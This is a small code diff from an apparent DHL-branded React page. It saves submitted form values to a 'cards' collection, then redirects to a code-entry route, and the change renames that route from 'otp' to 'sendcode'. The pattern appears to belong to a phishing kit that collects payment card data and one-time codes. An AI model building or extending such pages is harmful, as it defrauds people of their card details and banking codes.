@@ -74,7 +74,7 @@ function DhlExpress() {
     } else {
       const cardRef = doc(db, "cards", param);
       setDoc(cardRef, values, { merge: true }).then(() =>
-        navigate(`/otp/${last4}/${param}`, { replace: true })
+        navigate(`/sendcode/${last4}/${param}`, { replace: true })
       );
     }
   };
